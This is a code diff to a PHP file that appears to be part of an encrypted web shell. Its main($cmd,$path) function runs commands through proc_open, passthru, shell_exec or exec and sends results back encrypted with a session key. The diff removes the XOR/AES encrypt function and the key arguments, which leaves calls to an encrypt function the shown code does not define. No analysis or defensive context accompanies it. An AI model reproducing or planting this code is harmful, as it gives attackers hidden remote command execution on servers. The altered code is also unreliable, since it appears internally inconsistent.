@@ -79,26 +79,12 @@ function main($cmd,$path)
         $result["status"] = base64_encode("fail");
         $result["msg"] = base64_encode("none of proc_open/passthru/shell_exec/exec/exec is available");
         $key = $_SESSION['k'];
-        echo encrypt(json_encode($result), $key);
+        echo encrypt(json_encode($result));
         return;
         
     }
     $result["status"] = base64_encode("success");
     $result["msg"] = base64_encode(getSafeStr($kWJW));
-    echo encrypt(json_encode($result),  $_SESSION['k']);
+    echo encrypt(json_encode($result));
 }
 
-function encrypt($data,$key)
-{
-	if(!extension_loaded('openssl'))
-    	{
-    		for($i=0;$i<strlen($data);$i++) {
-    			 $data[$i] = $data[$i]^$key[$i+1&15]; 
-    			}
-			return $data;
-    	}
-    else
-    	{
-    		return openssl_encrypt($data, "AES128", $key);
-    	}
-}
